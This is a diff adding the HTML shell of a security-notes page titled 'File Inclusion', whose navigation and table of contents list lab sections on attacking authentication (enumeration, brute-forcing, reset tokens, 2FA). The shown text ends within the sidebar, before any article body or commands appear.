@@ -1,0 +1,2911 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Single-factor authentication relies on only one authentication factor to verify a user's identity.">
+      
+      
+        <meta name="author" content="Your Name">
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.0">
+    
+    
+      
+        <title>15. File Inclusion - Sec-Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.57a0d79d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.fb2fffe2.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Sans+Arabic:wght@400;600;700&display=swap">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/toc.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/search.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <meta property="og:site_name" content="Sec-Notes">
+<meta property="og:type" content="article">
+<meta property="og:title" content="15. File Inclusion · Sec-Notes">
+<meta property="og:description" content="Single-factor authentication relies on only one authentication factor to verify a user&#x27;s identity.">
+<meta property="og:image" content="../../../../assets/social-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="15. File Inclusion · Sec-Notes">
+<meta name="twitter:description" content="Single-factor authentication relies on only one authentication factor to verify a user&#x27;s identity.">
+<meta name="twitter:image" content="../../../../assets/social-default.png">
+<meta property="article:published_time" content="2026-09-31">
+</head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="notebook" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#file-inclusion" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="Sec-Notes" class="md-header__button md-logo" aria-label="Sec-Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Sec-Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              15. File Inclusion
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="notebook" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="dossier" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Sec-Notes" class="md-nav__button md-logo" aria-label="Sec-Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Sec-Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Library
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Library
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dashboard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    All Content
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web-appsec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web AppSec
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../network-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AI Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../api-sec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API Sec
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mobile-sec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile Sec
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../programming/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Programming
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../write-ups/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Write-ups
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../checklists/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Checklists
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Progress
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Progress
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../progress/this-week/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    This week
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#section-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is Authentication?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-vs-authorization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication vs. Authorization
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-authentication-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Authentication Methods
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#single-factor-authentication-sfa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Single-Factor Authentication (SFA)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multi-factor-authentication-mfa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Multi-Factor Authentication (MFA)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 2
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacks-on-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacks on Authentication
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-knowledge-based-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking Knowledge-Based Authentication
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-ownership-based-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking Ownership-Based Authentication
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-inherence-based-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking Inherence-Based Authentication
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-biostar-2-data-breach-2019" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example: BioStar 2 Data Breach (2019)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-comparison-of-authentication-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick Comparison of Authentication Attacks
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 3
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-user-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is User Enumeration?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-enumeration-theory" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Enumeration Theory
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-enumeration-via-differing-error-messages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Enumeration via Differing Error Messages
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-enumeration-via-side-channel-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Enumeration via Side-Channel Attacks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 4
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 4">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#understanding-password-brute-forcing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding Password Brute-Forcing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-a-custom-password-wordlist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create a Custom Password Wordlist
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Create a Custom Password Wordlist">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#method-1-using-grep" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Method 1: Using grep
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-2-using-awk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Method 2: Using awk
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#brute-force-the-password-with-ffuf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Brute-Force the Password with FFUF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 1
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 2
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 5
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 5">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#understanding-password-reset-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding Password Reset Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identify-a-weak-reset-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identify a Weak Reset Token
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generate-a-token-wordlist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generate a Token Wordlist
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-reset-tokens-with-ffuf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Test Reset Tokens with FFUF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 1:3
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 4
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 6
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 6">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#understanding-2fa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding 2FA
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identify-the-2fa-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identify the 2FA Mechanism
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understand-the-ffuf-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understand the FFUF Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 7
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 7">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rate-limits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rate Limits
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captchas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CAPTCHAs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 8
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 8">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#understanding-default-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding Default Credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-default-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding Default Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Finding Default Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#method-1-search-default-credential-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Method 1: Search default credential databases
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-2-search-the-internet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Method 2: Search the internet
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 9
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 9">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#guessable-password-reset-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Guessable Password Reset Questions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manipulating-the-reset-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manipulating the Reset Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 1
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question 2
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 10
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 10">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#overview_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-the-vulnerability-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the Vulnerability Works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 11
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 11">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#overview_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understanding-the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding the Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Question
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Section 12
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 12">
+      <ul class="md-nav__list">
+        
